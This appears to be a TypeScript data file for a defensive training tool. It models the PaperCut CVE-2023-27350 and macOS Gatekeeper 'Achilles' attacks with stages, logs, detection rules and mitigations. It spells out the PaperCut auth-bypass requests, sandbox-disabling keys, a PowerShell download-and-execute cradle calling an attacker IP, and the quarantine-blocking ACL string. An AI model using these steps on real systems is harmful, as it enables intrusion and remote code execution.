    Image|endswith:
      - '/sh'
      - '/bash'
      - '\\cmd.exe'
      - '\\powershell.exe'
      - '\\msiexec.exe'
  condition: selection
level: critical`,
        mitigation:
          'Block outbound HTTP/HTTPS requests from the ActiveMQ server and upgrade to ActiveMQ 5.18.3+ where createThrowable verifies Throwable.class.isAssignableFrom(clazz).',
      },
    },
  ],
};

export const PAPERCUT_NG_CVE_2023_27350_BL00DY_SCENARIO: AttackScenario = {
  id: 'papercut-ng-cve-2023-27350-bl00dy',
  code: 'CVE-2023-27350',
  name: 'Horizon3.ai, CISA & Microsoft — PaperCut MF/NG SetupCompleted Auth Bypass & Rhino JS SYSTEM RCE',
  shortSubtitle: 'CISA AA23-131A · Horizon3.ai · Bl00dy & Cl0p · /app?service=page/SetupCompleted & pc-app.exe',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Documented by Horizon3.ai, Joint CISA/FBI Advisory AA23-131A, and Microsoft Threat Intelligence (April–May 2023), CVE-2023-27350 (CVSS 9.8) is an unauthenticated session-hijacking and Remote Code Execution vulnerability in PaperCut MF and NG print management servers (< 20.1.7, 21.2.11, 22.0.9) exploited by the Bl00dy Ransomware Gang, Cl0p, and LockBit. By requesting the Apache Tapestry page /app?service=page/SetupCompleted and submitting the Login form listener (SetupCompleted.formSubmit()), an unauthenticated attacker triggers UserWebAuth.performLogin("admin", Role.ADMIN) to mint a full administrator JSESSIONID cookie. The attacker then disables the Rhino JavaScript sandbox (print.script.sandboxed=N) in ConfigEditor and injects java.lang.Runtime.getRuntime().exec() into a Printer Script, executing commands as NT AUTHORITY\\SYSTEM inside pc-app.exe.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Horizon3.ai Technical Root Cause · CISA/FBI AA23-131A · Microsoft Threat Intel · PaperCut Advisory',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (SetupCompleted Bypass) · T1059.007 (Mozilla Rhino JS Engine) · T1059.001 (SYSTEM PowerShell)',
    },
    {
      term: 'BYPASS & SANDBOX KEYS',
      value: '/app?service=page/SetupCompleted -> print-and-device.script.enabled=Y & print.script.sandboxed=N',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: 'server.log (SetupCompleted) -> ConfigEditor Audit -> Sysmon EID 1 (pc-app.exe -> powershell.exe)',
    },
  ],
  nodes: [
    {
      id: 'bl00dy_cl0p_actor',
      label: 'Bl00dy / Cl0p Operator',
      sublabel: '45.141.87.12 (CVE-2023-27350 Exploit)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'Ransomware Affiliate Exploit Host',
        pidOrPort: 'HTTP :9191 / HTTPS :9192',
        privilege: 'Unauthenticated External Attacker',
        artifacts: [
          'GET /app?service=page/SetupCompleted',
          'POST /app (service=direct/1/SetupCompleted/$Form&$Submit$0=Login)',
        ],
        description:
          'Ransomware operator targeting exposed PaperCut MF/NG print management portals on TCP port 9191/9192.',
      },
    },
    {
      id: 'papercut_tapestry_web',
      label: 'PaperCut Web (Tapestry :9191)',
      sublabel: '10.80.15.30 (SetupCompleted.class)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'PaperCut NG 22.0.5 Application Server (Windows Server)',
        pidOrPort: 'PID 2844 · TCP :9191 (Jetty / Apache Tapestry)',
        privilege: 'NT AUTHORITY\\SYSTEM',
        artifacts: [
          'pcng-server-web.jar (SetupCompleted.formSubmit)',
          'UserWebAuth.performLogin("admin", Role.ADMIN)',
        ],
        description:
          'Apache Tapestry web interface whose SetupCompleted onboarding page calls performLogin() for Admin without verifying setup state.',
      },
    },
    {
      id: 'papercut_rhino_engine',
      label: 'ConfigEditor & Rhino JS Engine',
      sublabel: 'print.script.sandboxed=N (pc-app.exe)',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'Embedded Mozilla Rhino JavaScript Engine (org.mozilla.javascript)',
        pidOrPort: 'PID 2844 (C:\\Program Files\\PaperCut NG\\server\\bin\\win\\pc-app.exe)',
        privilege: 'NT AUTHORITY\\SYSTEM',
        artifacts: [
          'print-and-device.script.enabled = Y',
          'print.script.sandboxed = N (Disables Rhino ClassShutter)',
        ],
        description:
          'PaperCut’s built-in printer scripting engine; disabling print.script.sandboxed removes the Rhino ClassShutter so scripts can call java.lang.Runtime.',
      },
    },
    {
      id: 'system_powershell_exec',
      label: 'SYSTEM Shell (pc-app.exe Child)',
      sublabel: 'Runtime.getRuntime().exec("powershell.exe")',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Windows SYSTEM Command Execution Context',
        pidOrPort: 'PID 6012 (powershell.exe spawned by pc-app.exe)',
        privilege: 'NT AUTHORITY\\SYSTEM',
        artifacts: [
          'java.lang.Runtime.getRuntime().exec(...)',
          'powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient)..."',
        ],
        description:
          'Executes immediately when the modified Printer Script is saved and evaluated by pc-app.exe as NT AUTHORITY\\SYSTEM.',
      },
    },
    {
      id: 'cisa_papercut_siem',
      label: 'Defender & Sysmon SIEM',
      sublabel: 'CISA AA23-131A Detection Rules',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'Enterprise SIEM & Endpoint Detection',
        pidOrPort: 'Sysmon EID 1 + PaperCut server.log',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'CISA AA23-131A Sigma Rule: pc-app.exe Spawning Shell',
          'PaperCut Audit Log: print.script.sandboxed modified to N',
        ],
        description:
          'Detects HTTP requests to page/SetupCompleted, ConfigEditor sandbox tampering, and pc-app.exe spawning PowerShell or cmd.exe.',
      },
    },
  ],
  processTree: [
    {
      pid: 2844,
      ppid: 712,
      name: 'pc-app.exe',
      commandLine: '"C:\\Program Files\\PaperCut NG\\server\\bin\\win\\pc-app.exe"',
      user: 'NT AUTHORITY\\SYSTEM',
      integrity: 'SYSTEM',
      status: 'injected',
      activeFromStage: 1,
      apiCalls: [
        'SetupCompleted.formSubmit() -> UserWebAuth.performLogin("admin")',
        'ConfigEditor.setConfig("print.script.sandboxed", "N")',
        'org.mozilla.javascript.Context.evaluateString("java.lang.Runtime.getRuntime().exec(...)")',
      ],
      memoryBlocks: [
        {
          address: '0x00000000E1200000',
          section: 'Mozilla Rhino Script Engine Context (Unsandboxed)',
          permissions: 'RW-',
          size: '48 KB',
          status: 'patched',
          description:
            'In-memory Rhino JavaScript evaluation context with ClassShutter disabled (print.script.sandboxed=N), permitting direct access to java.lang.Runtime.',
          hexPreview: '70 72 69 6E 74 2E 73 63 72 69 70 74 2E 73 61 6E',
        },
      ],
    },
    {
      pid: 6012,
      ppid: 2844,
      name: 'powershell.exe',
      commandLine: 'powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://45.141.87.12/ldr.ps1\')"',
      user: 'NT AUTHORITY\\SYSTEM',
      integrity: 'SYSTEM',
      status: 'malicious',
      activeFromStage: 3,
      apiCalls: [
        'CreateProcessW (Parent: pc-app.exe)',
        'Net.WebClient.DownloadString("http://45.141.87.12/ldr.ps1")',
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'Tapestry SetupCompleted Authentication Bypass (performLogin)',
      subtitle: 'Minting an Admin JSESSIONID via /app?service=page/SetupCompleted',
      description:
        'The attacker requests GET /app?service=page/SetupCompleted and submits POST /app with service=direct/1/SetupCompleted/$Form&sp=S0&$Submit$0=Login. SetupCompleted.formSubmit() executes performLogin("admin") and returns an authenticated Admin JSESSIONID cookie.',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application (CVE-2023-27350)',
      activeNodeIds: ['bl00dy_cl0p_actor', 'papercut_tapestry_web'],
      compromisedNodeIds: ['papercut_tapestry_web'],
      keySpecs: [
        { term: 'VULNERABLE PAGE', value: '/app?service=page/SetupCompleted' },
        { term: 'TAPESTRY FORM POST', value: 'service=direct/1/SetupCompleted/$Form&$Submit$0=Login' },
        { term: 'JAVA CALL', value: 'UserWebAuth.performLogin("admin", Role.ADMIN)' },
      ],
    },
    {
      index: 2,
      title: 'Disabling Print Script Sandbox (print.script.sandboxed=N)',
      subtitle: 'Unlocking Raw Java Reflection Inside the Mozilla Rhino Engine',
      description:
        'Using the hijacked Admin session, the attacker navigates to ConfigEditor (/app?service=page/ConfigEditor) and sets print-and-device.script.enabled=Y and print.script.sandboxed=N so the embedded Mozilla Rhino JavaScript engine can access raw Java classes.',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1059.007',
      mitreTechniqueName: 'Command and Scripting Interpreter: JavaScript (Mozilla Rhino)',
      activeNodeIds: ['bl00dy_cl0p_actor', 'papercut_tapestry_web', 'papercut_rhino_engine'],
      compromisedNodeIds: ['papercut_tapestry_web', 'papercut_rhino_engine'],
      keySpecs: [
        { term: 'ENABLE SCRIPTING KEY', value: 'print-and-device.script.enabled = Y' },
        { term: 'DISABLE SANDBOX KEY', value: 'print.script.sandboxed = N' },
        { term: 'JS ENGINE', value: 'Mozilla Rhino (org.mozilla.javascript)' },
      ],
    },
    {
      index: 3,
      title: 'Rhino JS Runtime.getRuntime().exec() as SYSTEM (pc-app.exe)',
      subtitle: 'Evaluating Injected Printer Script to Spawn SYSTEM PowerShell',
      description:
        'The attacker edits a template printer script in PrinterDetails (/app?service=page/PrinterDetails) and injects java.lang.Runtime.getRuntime().exec("powershell.exe ..."). Saving the script immediately compiles and executes the payload inside pc-app.exe running as NT AUTHORITY\\SYSTEM.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1059.001',
      mitreTechniqueName: 'Command and Scripting Interpreter: PowerShell (SYSTEM)',
      activeNodeIds: ['papercut_rhino_engine', 'system_powershell_exec', 'cisa_papercut_siem'],
      compromisedNodeIds: ['papercut_tapestry_web', 'papercut_rhino_engine', 'system_powershell_exec'],
      keySpecs: [
        { term: 'RHINO PAYLOAD', value: 'java.lang.Runtime.getRuntime().exec("powershell.exe ...")' },
        { term: 'PARENT PROCESS', value: 'C:\\Program Files\\PaperCut NG\\server\\bin\\win\\pc-app.exe' },
        { term: 'PRIVILEGE LEVEL', value: 'NT AUTHORITY\\SYSTEM' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'pcut-27350-1',
      no: 1,
      stageIndex: 1,
      timestamp: '10:05:14.209',
      sourceNodeId: 'bl00dy_cl0p_actor',
      targetNodeId: 'papercut_tapestry_web',
      sourceLabel: 'Bl00dy Operator',
      targetLabel: 'PaperCut Web (:9191)',
      sourceType: 'NETWORK',
      protocolOrEventId: 'HTTP POST / server.log',
      shortAction: 'SETUPCOMPLETED BYPASS',
      info: 'POST /app (service=direct/1/SetupCompleted/$Form&$Submit$0=Login) -> Set-Cookie: JSESSIONID=node01x9a8b7c',
      sizeOrCode: 'HTTP 302 (Admin Cookie)',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation:
        'Unauthenticated attacker invokes SetupCompleted.formSubmit() to mint an authenticated Admin JSESSIONID cookie.',
      rawLog: `45.141.87.12 - - [19/Apr/2023:10:05:14 +0000] "GET /app?service=page/SetupCompleted HTTP/1.1" 200 6412
45.141.87.12 - - [19/Apr/2023:10:05:14 +0000] "POST /app HTTP/1.1" body="service=direct%2F1%2FSetupCompleted%2F%24Form&sp=S0&Form0=%24Hidden%2C%24Submit%2C%24Submit%240&%24Hidden=true&%24Submit%240=Login" 302 -> /app?service=page/AdminHome`,
      detectionRule: {
        type: 'SURICATA',
        title: 'PaperCut MF/NG SetupCompleted Authentication Bypass (CVE-2023-27350)',
        ruleCode: `alert http any any -> $HOME_NET [9191,9192] (msg:"ET EXPLOIT PaperCut MF/NG Auth Bypass (CVE-2023-27350)"; flow:established,to_server; http.uri; content:"SetupCompleted"; classtype:attempted-admin; sid:2045109; rev:1;)`,
        mitigation:
          'Upgrade PaperCut MF/NG to 20.1.7, 21.2.11, or 22.0.9+ and block external access to ports 9191/9192.',
      },
    },
    {
      id: 'pcut-27350-2',
      no: 2,
      stageIndex: 2,
      timestamp: '10:05:18.550',
      sourceNodeId: 'papercut_tapestry_web',
      targetNodeId: 'papercut_rhino_engine',
      sourceLabel: 'Admin Session (Hijacked)',
      targetLabel: 'PaperCut ConfigEditor',
      sourceType: 'WIN_EVENT',
      protocolOrEventId: 'PaperCut Application Log',
      shortAction: 'SANDBOX DISABLED',
      info: 'Config key "print-and-device.script.enabled"="Y" and "print.script.sandboxed"="N" updated by admin',
      sizeOrCode: 'Rhino Unsandboxed',
      severity: 'HIGH',
      mitreId: 'T1059.007',
      explanation:
        'Attacker enables printer scripting and disables the Rhino JavaScript sandbox so scripts can invoke java.lang.Runtime.',
      rawLog: `2023-04-19 10:05:18,548 INFO  [AdminAudit] User [admin] (IP: 45.141.87.12) updated config property [print-and-device.script.enabled] from [N] to [Y]
2023-04-19 10:05:18,712 INFO  [AdminAudit] User [admin] (IP: 45.141.87.12) updated config property [print.script.sandboxed] from [Y] to [N]`,
      detectionRule: {
        type: 'SIGMA',
        title: 'PaperCut Print Script Sandbox Disabled in Application Log',
        ruleCode: `title: PaperCut CVE-2023-27350 Print Script Sandbox Tampering
logsource:
  product: papercut
detection:
  selection:
    message|contains:
      - 'print-and-device.script.enabled'
      - 'print.script.sandboxed'
  condition: selection
level: critical`,
        mitigation:
          'Audit PaperCut Application Log entries for unexpected changes to print.script.sandboxed and admin logins originating from external IPs.',
      },
    },
    {
      id: 'pcut-27350-3',
      no: 3,
      stageIndex: 3,
      timestamp: '10:05:23.904',
      sourceNodeId: 'papercut_rhino_engine',
      targetNodeId: 'system_powershell_exec',
      sourceLabel: 'pc-app.exe (SYSTEM)',
      targetLabel: 'powershell.exe (PID 6012)',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 1 (ProcessCreate)',
      shortAction: 'PC-APP.EXE SPAWNS SHELL',
      info: 'pc-app.exe spawns powershell.exe -nop -w hidden via Rhino java.lang.Runtime.getRuntime().exec()',
      sizeOrCode: 'PID 6012 (SYSTEM)',
      severity: 'CRITICAL',
      mitreId: 'T1059.001',
      explanation:
        'CISA AA23-131A primary detection indicator: pc-app.exe spawning child command shells (cmd.exe, powershell.exe) as NT AUTHORITY\\SYSTEM.',
      rawLog: `EventID: 1 (Process Create)
ParentImage: C:\\Program Files\\PaperCut NG\\server\\bin\\win\\pc-app.exe
ParentProcessId: 2844
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
ProcessId: 6012
CommandLine: powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://45.141.87.12/ldr.ps1')"
User: NT AUTHORITY\\SYSTEM`,
      detectionRule: {
        type: 'SIGMA',
        title: 'PaperCut pc-app.exe Spawning Suspicious Child Process (CISA AA23-131A)',
        ruleCode: `title: PaperCut MF/NG Server Spawning Shell Interpreter (CVE-2023-27350)
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\\pc-app.exe'
    Image|endswith:
      - '\\cmd.exe'
      - '\\powershell.exe'
      - '\\pwsh.exe'
      - '\\certutil.exe'
      - '\\bitsadmin.exe'
      - '\\msiexec.exe'
  condition: selection
level: critical`,
        mitigation:
          'Configure EDR to block pc-app.exe from spawning child shells and isolate any print server exhibiting child process creation.',
      },
    },
  ],
};

export const MACOS_GATEKEEPER_ACHILLES_CVE_2022_42821_SCENARIO: AttackScenario = {
  id: 'macos-gatekeeper-achilles-cve-2022-42821',
  code: 'CVE-2022-42821',
  name: 'Microsoft Threat Intel & Jamf — macOS Gatekeeper "Achilles" Bypass via AppleDouble Restrictive ACLs',
  shortSubtitle: 'Microsoft Research (Jonathan Bar Or) · Jamf · CVE-2022-42821 · AppleDouble ._ ACL deny writeextattr',
  category: 'MALWARE',
  severity: 'HIGH',
  primaryMitrePhase: 4,
  overview:
    'Discovered by Microsoft Threat Intelligence researcher Jonathan Bar Or and analyzed with Jamf Threat Labs (December 2022), CVE-2022-42821 ("Achilles") is a critical logic flaw in macOS Gatekeeper and Lockdown Mode. On macOS, Gatekeeper only verifies Developer ID signatures and Notarization tickets on downloaded apps that carry the com.apple.quarantine extended attribute. By packaging an unsigned Payload.app inside a ZIP archive alongside an AppleDouble metadata file (._Payload.app) containing an NFSv4 Access Control List (ACL) that explicitly denies writeextattr permissions to everyone, the attacker causes Safari’s setxattr("com.apple.quarantine") call to fail with EACCES—allowing the unsigned app to execute with zero Gatekeeper warnings.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Microsoft Security Threat Intelligence (Achilles) · Jamf Threat Labs · Apple HT213532',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1553.001 (Gatekeeper Bypass) · T1222.002 (Linux/Mac File Permissions & ACL) · T1204.002 (Malicious App)',
    },
    {
      term: 'APPLEDOUBLE ACL',
      value: '._Update.app -> com.apple.acl.text ("group:everyone deny write,writeattr,writeextattr,chown")',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: 'copyfile_unpack(._Update.app) -> setxattr(com.apple.quarantine) EACCES -> ES_EVENT_TYPE_NOTIFY_EXEC',
    },
  ],
  nodes: [
    {
      id: 'achilles_archive_builder',
      label: 'Achilles Archive Packager',
      sublabel: '198.51.100.77 (Update.zip + ._Update.app)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'Adversary Payload Staging Server',
        pidOrPort: 'HTTPS :443 (Crafted AppleDouble ZIP)',
        privilege: 'External Web Delivery',
        artifacts: [
          'Update.zip containing Update.app and ._Update.app',
          'AppleDouble magic 0x00051607 with com.apple.acl.text xattr',
        ],
        description:
          'Serves a ZIP archive containing an unsigned macOS application paired with an AppleDouble metadata file holding a restrictive NFSv4 ACL.',
      },
    },
    {
      id: 'safari_archive_utility',
      label: 'Safari & Archive Utility',
      sublabel: 'copyfile_unpack() -> setxattr EACCES',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'macOS Ventura / Monterey Endpoint',
        pidOrPort: 'PID 890 (ArchiveService / com.apple.WebKit.Networking)',
        privilege: 'Standard macOS User',
        artifacts: [
          'copyfile_unpack() restores com.apple.acl.text from ._Update.app',
          'setxattr("com.apple.quarantine") -> errno 13 (EACCES)',
        ],
        description:
          'Applies the AppleDouble restrictive ACL during extraction, which subsequently blocks Safari/ArchiveService from writing com.apple.quarantine.',
      },
    },
    {
      id: 'syspolicyd_gatekeeper',
      label: 'LaunchServices & syspolicyd',
      sublabel: 'Gatekeeper / Lockdown Mode Evaluator',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'macOS Gatekeeper Policy Daemon (syspolicyd)',
        pidOrPort: 'PID 612 (/usr/libexec/syspolicyd)',
        privilege: 'root (macOS Security Subsystem)',
        artifacts: [
          'getxattr("com.apple.quarantine") -> ENOATTR (Not Found)',
          'Gatekeeper & Notarization check bypassed (Assumed Local File)',
        ],
        description:
          'Because com.apple.quarantine is missing from Update.app, syspolicyd assumes the binary was created locally and skips Gatekeeper and Lockdown Mode checks.',
      },
    },
    {
      id: 'unsigned_macho_payload',
      label: 'Unsigned Mach-O Execution',
      sublabel: '~/Downloads/Update.app/Contents/MacOS/Update',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Unsigned / Unnotarized Mach-O Binary',
        pidOrPort: 'PID 1420 (Update)',
        privilege: 'User Context (Zero Gatekeeper Prompts)',
        artifacts: [
          '~/Downloads/Update.app/Contents/MacOS/Update',
          'Code Signature: None / Ad-Hoc, Notarized: false',
        ],
        description:
          'Executes directly from ~/Downloads without displaying any Gatekeeper warning or blocking dialog to the user.',
      },
    },
    {
      id: 'jamf_defender_esf',
      label: 'Jamf Protect & Defender (ESF)',
      sublabel: 'ES_EVENT_TYPE_NOTIFY_EXEC Monitor',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'macOS Endpoint Security Framework (ESF) Sensor',
        pidOrPort: 'ES_EVENT_TYPE_NOTIFY_EXEC + Unified Log',
        privilege: 'Root ESF Client',
        artifacts: [
          'Unsigned Mach-O executing from ~/Downloads without com.apple.quarantine',
          'Extended attribute ACL containing deny writeextattr',
        ],
        description:
          'Detects Achilles exploitation by correlating AppleDouble ACL extraction with unquarantined, unsigned binary execution from ~/Downloads.',
      },
    },
  ],
  processTree: [
    {
      pid: 890,
      ppid: 1,
      name: 'ArchiveService (Safari Unpack)',
      commandLine: '/System/Library/Frameworks/FileProvider.framework/Support/ArchiveService',
      user: 'analyst',
      integrity: 'Medium',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: [
        'copyfile_unpack("._Update.app") -> setacl(deny writeextattr)',
        'setxattr("Update.app", "com.apple.quarantine") -> -1 (EACCES)',
      ],
    },
    {
      pid: 612,
      ppid: 1,
      name: 'syspolicyd (Gatekeeper)',
      commandLine: '/usr/libexec/syspolicyd',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'normal',
      activeFromStage: 2,
      apiCalls: [
        'getxattr("Update.app", "com.apple.quarantine") -> ENOATTR',
        'gk_perform_evaluation() -> ALLOW (No Quarantine xattr present)',
      ],
      memoryBlocks: [
        {
          address: '0x0000600001840000',
          section: 'Gatekeeper Policy Evaluation Context',
          permissions: 'RW-',
          size: '16 KB',
          status: 'patched',
          description:
            'syspolicyd evaluation state showing has_quarantine=0, causing Developer ID and Notarization checks to be skipped.',
          hexPreview: '71 75 61 72 61 6E 74 69 6E 65 3D 30 30 20 61 6C',
        },
      ],
    },
    {
      pid: 1420,
      ppid: 1,
      name: 'Update (Unsigned Mach-O)',
      commandLine: '/Users/analyst/Downloads/Update.app/Contents/MacOS/Update',
      user: 'analyst',
      integrity: 'Medium',
      status: 'malicious',
      activeFromStage: 3,
      apiCalls: [
        'posix_spawn("/Users/analyst/Downloads/Update.app/Contents/MacOS/Update")',
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'AppleDouble (._) Restrictive ACL Extraction (deny writeextattr)',
      subtitle: 'Unpacking ._Update.app to Apply an NFSv4 ACL Forbidding Extended Attribute Writes',
      description:
        'The user downloads Update.zip in Safari. The archive contains Update.app and an AppleDouble metadata file (._Update.app) storing a com.apple.acl.text attribute: group:everyone deny write,writeattr,writeextattr,writesecurity,chown.',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1222.002',
      mitreTechniqueName: 'File and Directory Permissions Modification: Linux and Mac (ACL)',
      activeNodeIds: ['achilles_archive_builder', 'safari_archive_utility'],
      compromisedNodeIds: ['safari_archive_utility'],
      keySpecs: [
        { term: 'APPLEDOUBLE FILE', value: '._Update.app (Magic 0x00051607)' },
        { term: 'EMBEDDED XATTR', value: 'com.apple.acl.text' },
        { term: 'RESTRICTIVE ACL', value: 'group:everyone deny write,writeattr,writeextattr,writesecurity,chown' },
      ],
    },
    {
      index: 2,
      title: 'setxattr(com.apple.quarantine) Blocked by Kernel ACL Check',
      subtitle: 'XNU Kernel Rejects Safari Quarantine Tagging With EACCES',
      description:
        'When Safari / Archive Utility attempts to apply the com.apple.quarantine extended attribute to the extracted bundle via setxattr(), the macOS XNU kernel evaluates the newly restored ACL and rejects the write with EACCES, leaving the app completely unquarantined.',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1553.001',
      mitreTechniqueName: 'Subvert Trust Controls: Gatekeeper Bypass (CVE-2022-42821)',
      activeNodeIds: ['safari_archive_utility', 'syspolicyd_gatekeeper'],
      compromisedNodeIds: ['safari_archive_utility', 'syspolicyd_gatekeeper'],
      keySpecs: [
        { term: 'BLOCKED SYSCALL', value: 'setxattr("Update.app", "com.apple.quarantine", ...)' },
        { term: 'KERNEL ERROR', value: 'errno 13 (EACCES — Permission denied by ACL)' },
        { term: 'QUARANTINE XATTR', value: 'ABSENT (Failed Open)' },
      ],
    },
    {
      index: 3,
      title: 'Gatekeeper & Lockdown Mode Bypass on App Launch',
      subtitle: 'syspolicyd Skips Signature & Notarization Checks on Unquarantined Bundle',
      description:
        'When the user double-clicks Update.app in Finder, LaunchServices queries syspolicyd (Gatekeeper). Because com.apple.quarantine is missing from the Mach-O binary, Gatekeeper skips Developer ID and Notarization checks and executes the unsigned payload immediately.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1204.002',
      mitreTechniqueName: 'User Execution: Malicious File (Unquarantined Mach-O)',
      activeNodeIds: ['syspolicyd_gatekeeper', 'unsigned_macho_payload', 'jamf_defender_esf'],
      compromisedNodeIds: ['safari_archive_utility', 'syspolicyd_gatekeeper', 'unsigned_macho_payload'],
      keySpecs: [
        { term: 'EXECUTED BINARY', value: '~/Downloads/Update.app/Contents/MacOS/Update' },
        { term: 'CODE SIGNATURE', value: 'Unsigned / Unnotarized' },
        { term: 'PATCHED OS', value: 'macOS Ventura 13.1, Monterey 12.6.2, Big Sur 11.7.2' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'mac-42821-1',
      no: 1,
      stageIndex: 1,
      timestamp: '16:40:02.114',
      sourceNodeId: 'achilles_archive_builder',
      targetNodeId: 'safari_archive_utility',
      sourceLabel: 'Update.zip Archive',
      targetLabel: 'ArchiveService (copyfile)',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'macOS copyfile_unpack',
      shortAction: 'APPLEDOUBLE ACL RESTORED',
      info: '._Update.app unpacks com.apple.acl.text ("group:everyone deny write,writeattr,writeextattr,writesecurity,chown")',
      sizeOrCode: 'ACL deny writeextattr',
      severity: 'HIGH',
      mitreId: 'T1222.002',
      explanation:
        'AppleDouble metadata file restores a restrictive NFSv4 ACL onto the extracted .app bundle that explicitly denies writeextattr permissions.',
      rawLog: `[ArchiveService] copyfile_unpack("/Users/analyst/Downloads/._Update.app" -> "/Users/analyst/Downloads/Update.app")
Restored xattr: com.apple.acl.text = "!...#acl 1\\ngroup:ABCDEFAB-CDEF-ABCD-EFAB-CDEF0000000C:everyone:12:deny:write,writeattr,writeextattr,writesecurity,chown"`,
      detectionRule: {
        type: 'YARA',
        title: 'YARA Rule Detecting AppleDouble File With Restrictive Achilles ACL (CVE-2022-42821)',
        ruleCode: `rule MacOS_Achilles_AppleDouble_ACL_CVE_2022_42821 {
  meta:
    author = "Microsoft Threat Intel / Jamf Defense Synthesis"
    cve = "CVE-2022-42821"
  strings:
    $magic = { 00 05 16 07 00 02 00 00 }
    $xattr = "com.apple.acl.text" ascii
    $deny  = "deny" ascii
    $wext  = "writeextattr" ascii
  condition:
    $magic at 0 and $xattr and $deny and $wext
}`,
        mitigation:
          'Scan incoming ZIP/TAR archives for AppleDouble (._*) entries containing com.apple.acl.text and update macOS to 13.1+ / 12.6.2+.',
      },
    },
    {
      id: 'mac-42821-2',
      no: 2,
      stageIndex: 2,
      timestamp: '16:40:02.309',
      sourceNodeId: 'safari_archive_utility',
      targetNodeId: 'syspolicyd_gatekeeper',
      sourceLabel: 'Safari / ArchiveService',
      targetLabel: 'XNU Kernel VFS (setxattr)',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'XNU Audit / setxattr',
      shortAction: 'QUARANTINE WRITE BLOCKED',
      info: 'setxattr("/Users/analyst/Downloads/Update.app", "com.apple.quarantine") -> errno 13 (EACCES)',
      sizeOrCode: 'EACCES (No Quarantine)',
      severity: 'CRITICAL',
      mitreId: 'T1553.001',
      explanation:
        'The restrictive ACL prevents Safari or Archive Utility from writing the com.apple.quarantine extended attribute to the extracted bundle.',
      rawLog: `audit_syscall: proc="ArchiveService" pid=890 syscall=setxattr(236)
path="/Users/analyst/Downloads/Update.app" attrname="com.apple.quarantine" val="0083;639a1b00;Safari;"
return=-1 errno=13 (EACCES: Permission denied by ACL deny writeextattr)`,
      detectionRule: {
        type: 'SIGMA',
        title: 'macOS Quarantine Attribute Write Blocked by Restrictive ACL',
        ruleCode: `title: macOS Gatekeeper Achilles Quarantine Write Failure (CVE-2022-42821)
logsource:
  product: macos
  service: endpointsecurity
detection:
  selection:
    event_type: 'ES_EVENT_TYPE_NOTIFY_SETEXTATTR'
    extattr_name: 'com.apple.quarantine'
    result: 'EACCES'
  condition: selection
level: critical`,
        mitigation:
          'Apple patched CVE-2022-42821 in macOS Ventura 13.1 and Monterey 12.6.2 by enforcing quarantine propagation regardless of AppleDouble ACLs.',
      },
    },
    {
      id: 'mac-42821-3',
      no: 3,
      stageIndex: 3,
      timestamp: '16:40:09.772',
      sourceNodeId: 'syspolicyd_gatekeeper',
      targetNodeId: 'unsigned_macho_payload',
      sourceLabel: 'LaunchServices / syspolicyd',
      targetLabel: 'Update.app (Unsigned Mach-O)',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'ES_EVENT_TYPE_NOTIFY_EXEC',
      shortAction: 'GATEKEEPER BYPASSED',
      info: 'Unsigned Mach-O executes from ~/Downloads/Update.app without com.apple.quarantine or Gatekeeper dialog',
      sizeOrCode: 'PID 1420 (Unsigned)',
      severity: 'CRITICAL',
      mitreId: 'T1204.002',
      explanation:
        'Jamf Protect and Microsoft Defender for Endpoint detect the execution of an unsigned Mach-O bundle in ~/Downloads that lacks com.apple.quarantine.',
      rawLog: `[ES_EVENT_TYPE_NOTIFY_EXEC]
process.executable.path: "/Users/analyst/Downloads/Update.app/Contents/MacOS/Update"
process.signing_id: null
process.is_platform_binary: false
file.quarantine_attribute: null
file.acl: "group:everyone deny write,writeattr,writeextattr,writesecurity,chown"`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Unsigned macOS Application Executing From Downloads Without Quarantine Attribute',
        ruleCode: `title: Unsigned macOS Binary Executed From Downloads Without Quarantine (Achilles)
logsource:
  product: macos
  category: process_creation
detection:
  selection:
    Image|contains: '/Downloads/'
    Image|endswith: '.app/Contents/MacOS/*'
    IsSigned: false
    HasQuarantineAttribute: false
  condition: selection
level: critical`,
        mitigation:
